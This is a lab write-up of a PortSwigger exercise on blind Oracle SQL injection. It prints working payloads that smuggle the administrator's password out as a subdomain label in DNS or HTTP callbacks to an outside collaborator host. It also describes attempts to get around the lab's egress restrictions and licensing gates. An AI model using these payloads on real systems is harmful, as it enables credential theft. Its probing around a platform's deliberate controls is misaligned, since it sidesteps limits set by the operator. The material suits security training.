# Blind SQL injection with out-of-band data exfiltration

**Category:** SQL Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

The previous lab proved we could make an Oracle database phone home — a DNS lookup was enough to
confirm the injection fired. This lab asks for something harder: not just proof of a callback, but
the administrator's actual password, carried out through that same callback with zero feedback in
the HTTP response at all. It took several dead ends before that actually worked, and the dead ends
are worth telling honestly, because they're the difference between "out-of-band SQL injection" as
a concept and what it actually takes to pull off against a specific hardened target.

## The Target

The same `TrackingId` cookie injection point from the previous lab, same Oracle backend — but this
time the query is fully asynchronous from the application's point of view. There's no boolean
signal, no conditional error, no timing delta, and no `/submitSolution` endpoint to call once data
is recovered. The only way the password ever surfaces is inside a DNS or HTTP request the database
makes to infrastructure we control, which means we needed a way to actually *read* that
infrastructure's logs, not just trigger a request against it.

## The Investigation

The payload shape itself wasn't the hard part — we already had it from the previous lab: an
Oracle `EXTRACTVALUE(xmltype(...))` construction that forces an external DTD fetch, with the
target hostname built by string-concatenating the administrator's password as a subdomain label in
front of our callback domain:

```
'||(SELECT UTL_INADDR.get_host_address(
     (SELECT password FROM users WHERE username='administrator')||'.<collaborator-domain>'
   ) FROM dual)||'
```

The database resolves that concatenated hostname as a single DNS lookup — `<password>.<our-domain>`
— which means the password arrives at our infrastructure as the leftmost label of an incoming DNS
query, readable straight out of the query log. Getting that payload built wasn't the problem. Being
able to *read the resulting interaction* was.

**First dead end — third-party OAST providers.** We tried routing the callback through `interactsh`
(`oast.live`, `oast.pro`, and similar public out-of-band services) instead of Burp's own
infrastructure, since those don't require a Burp Suite Professional license at all. Every one of
those domains was silently blocked at the lab's network egress — Academy labs only permit outbound
traffic to `*.oastify.com` and `*.burpcollaborator.net`, and nothing else, precisely to prevent
exactly this workaround.

**Second dead end — polling Collaborator directly.** Burp Collaborator's own polling endpoint
looked promising: request a Collaborator ID, then poll `polling.burpcollaborator.net` for results
against it. In practice this consistently returned an empty result, because the mapping from a
client-visible interaction ID to the actual subdomain label the server is watching for is a
proprietary key-derivation step inside Burp's own client — not something reconstructable from
outside Burp's own tooling.

**Third dead end — the Community Edition API.** Burp's own client API exposes methods that look
purpose-built for this — `createBurpCollaboratorClientContext()`, `api.collaborator().createClient()`
— but both returned `null` when called from Burp Suite Community Edition. Collaborator client
creation is a Professional-only feature; Community Edition can send Collaborator payloads embedded
in requests, but can't create the polling context needed to read the results back.

**The realization.** Every one of those dead ends pointed the same direction: this lab's data
channel isn't reachable through any workaround, self-hosted alternative, or free-tier API — it
requires Burp Suite Professional's actual Collaborator client, reading actual DNS/HTTP interaction
logs that only Burp Pro's licensed infrastructure exposes. Once we had Burp Pro available through
its MCP tool interface, the path became straightforward.

## The Exploit

With Burp Pro's Collaborator client reachable through MCP tooling, the flow was four steps:

1. **Generate a Collaborator payload.** This returns a fresh, unique subdomain
   (e.g. `xghggzeil3bdrwjy4zl2v6u70y6uuj.oastify.com`) that only this Collaborator client instance
   is watching.

2. **Send the exfiltration request.** A `GET /` with a raw `Cookie` header (built manually, not
   through a cookie-jar mechanism, for the same character-mangling reasons documented in the
   previous lab) carrying the full Oracle XML-external-entity payload:

   ```
   TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||
   (SELECT password FROM users WHERE username='administrator')||
   '.<collaborator-subdomain>/"> %remote;]>'),'/l') FROM dual--
   ```

3. **Poll for the interaction.** After roughly ten seconds, reading back the Collaborator client's
   recorded interactions for that payload ID surfaced an inbound HTTP request whose `Host` header
   was `<password>.<collaborator-subdomain>` — the administrator's password sitting in plain sight
   as the leftmost DNS label.

4. **Log in through the browser, not the API.** This was the last snag: submitting the recovered
   password to `/login` via a direct API request returned a normal successful `302` redirect, but
   the lab tracker stayed stubbornly on "Not solved." The lab's solve condition isn't "a valid
   login happened somewhere" — it specifically requires the authenticated session to exist in the
   same browser context that opened the lab. Completing the same login through an actual browser
   session flipped the tracker immediately.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's own solution uses the identical payload — the same `EXTRACTVALUE(xmltype(...))`
construction with the password concatenated as a subdomain label — inserted via Burp's "Insert
Collaborator payload" right-click action rather than a manually substituted domain string. The
underlying SQL injection technique is exactly the one we landed on, byte for byte in substance.

Every dead end documented above exists precisely because PortSwigger's intended path assumes Burp
Suite Professional from the start: "Poll now" in Burp's Collaborator tab is the same operation as
our step 3, just clicked in a GUI instead of called through MCP tooling. There's no meaningful
technique divergence here at all — this lab is a genuine case where the tool *is* the technique,
because reading a Collaborator interaction log has no path around Burp Pro's own infrastructure.
What differs is everything we ruled out on the way there, which the official solution doesn't need
to address because it starts from Burp Pro being available.

## What This Teaches Us

This lab is less about SQL syntax than the previous ones and more about a fact worth internalizing
about out-of-band exploitation generally: the payload construction is often the easy part, and
*having infrastructure that can actually observe the callback* is the real constraint. It's also a
sharp illustration of defense in depth working as intended from the lab platform's own side —
restricting egress to a single whitelisted OAST domain closed off the free workarounds cleanly, and
gating Collaborator's polling behind licensed tooling meant no amount of clever HTTP client code
could substitute for it. On the target side, the fix is unchanged from every other lab in this
series — a parameterized `TrackingId` value never reaches the SQL parser — but this lab is a good
reminder that even a fully blind, fully asynchronous injection point with no in-band signal
whatsoever is not actually safe by virtue of being hard to observe; it just shifts the cost from the
payload to the listening infrastructure.
